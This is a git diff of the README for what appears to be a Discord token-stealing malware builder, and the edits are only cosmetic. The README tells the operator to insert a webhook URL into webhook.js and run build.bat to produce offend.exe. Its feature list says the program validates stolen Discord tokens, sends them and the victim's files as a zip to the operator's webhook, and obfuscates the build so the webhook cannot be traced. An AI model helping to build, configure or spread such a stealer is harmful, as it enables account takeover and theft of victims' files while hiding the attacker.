@@ -39,19 +39,19 @@
 
 > Install [Node.js](https://nodejs.org/en/download/) 
 > 
-> IMPORTANT: When installing Node.js also install "Tools for Native Modules" => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
+> IMPORTANT: When installing Node.js also install "Tools for Native Modules" => Tick "Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes".
 > 
 > This will take a few minutes because it will download up to 2 GB of data
 >
-> Install [Visual studio](https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSFeaturesPage&passive=true&tailored=cplus&cid=2031#cplusplus) with C++ compilers and all enabled (is a bit gigs but u wont have errors)
+> Install [Visual studio](https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSFeaturesPage&passive=true&tailored=cplus&cid=2031#cplusplus) with C++ compilers and all enabled (it's some gigs but u wont have errors)
 > 
-> Run **_install.bat_** file to install all necessary files
+> Run `install.bat` file to install all necessary files
 >
-> Replace _REPLACE_ME_ with your webhook url in **_webhook.js_**
+> Replace `_REPLACE_ME_` with your webhook url in `webhook.js`
 >
-> Run **_build.bat_** and wait for **_offend.exe_** to be built.
+> Run `build.bat` and wait for `offend.exe` to be built.
 >
-> Note: Changing the icon does not work and will corrupt the exe
+> Note: Changing the icon does not work and will corrupt the .exe
 
 <a id="features"></a>
 
@@ -98,7 +98,7 @@
 >
 > Validates a found discord token and then sends it to your discord webhook
 >
-> Sends all files to your discord webhook in beautiful embeds and a structured zip file
+> Sends all files to your discord webhook in beautiful embeds and a structured .zip file
 >
 > Automatic obfuscation when building (webhook won't be traceable & reverseable at all)
 
